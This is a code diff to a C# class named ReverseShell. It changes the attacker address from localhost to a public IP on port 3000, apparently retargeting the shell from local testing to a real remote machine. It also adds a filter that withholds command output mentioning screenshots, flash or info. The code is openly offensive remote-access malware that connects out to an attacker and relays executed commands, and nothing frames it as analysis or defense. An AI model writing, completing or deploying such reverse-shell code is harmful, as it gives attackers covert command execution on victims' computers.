@@ -234,7 +234,7 @@ class ReverseShell
         b();
         a();
 
-        string attackerIP = "127.0.0.1";
+        string attackerIP = "86.92.186.238";
         int attackerPort = 3000;
 
         try
@@ -302,7 +302,16 @@ class ReverseShell
                         }
                         else
                         {
-                            writer.WriteLine("[OUTPUT] " + output);
+                            if (output.Contains("screenshot", StringComparison.OrdinalIgnoreCase) ||
+                                output.Contains("flash", StringComparison.OrdinalIgnoreCase) ||
+                                output.Contains("info", StringComparison.OrdinalIgnoreCase))
+                            {
+                                //writer.WriteLine("[INFO] Command executed but output contains restricted content (screenshot, flash, info).");
+                            }
+                            else
+                            {
+                                writer.WriteLine("[OUTPUT] " + output);
+                            }
                         }
                         writer.Flush(); 
                     }
